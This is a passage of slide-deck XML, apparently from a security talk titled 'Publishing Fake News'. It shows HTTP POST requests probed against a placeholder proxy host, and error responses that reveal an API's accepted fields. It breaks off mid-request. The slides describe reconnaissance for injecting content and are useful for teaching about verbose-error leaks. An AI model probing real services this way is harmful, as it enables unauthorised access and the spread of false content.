            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>POST /create “x=x”</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>=&gt; 405 Method Not Allowed</a:t>
            </a:r>
            <a:endParaRPr sz="2700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="188" name="Google Shape;188;p28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="192" name="Shape 192"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="193" name="Google Shape;193;p29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;194;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="195" name="Google Shape;195;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Publishing Fake News</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="196" name="Google Shape;196;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1239175"/>
            <a:ext cx="8073300" cy="3324600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>POST /create </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Host: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>xyzproxy.prod.k8s.cf.example.com</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Content-Type: application/json </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>{"cdl":"cdl"} </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Error: Unrecognized field “cdl”. </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>5 known properties: "</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>streams</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>", "</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>uuid</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>, "</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>title</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>", "</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>", </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>tags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>", "</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>category</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="197" name="Google Shape;197;p29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="201" name="Shape 201"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="202" name="Google Shape;202;p30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;203;p30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="204" name="Google Shape;204;p30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Publishing Fake News</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="205" name="Google Shape;205;p30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683875" y="1008075"/>
            <a:ext cx="8073300" cy="5081700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>POST /create </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Host: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>xyzproxy.prod.k8s.cf.example.com</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Content-Type: application/json </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"streams": "a",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
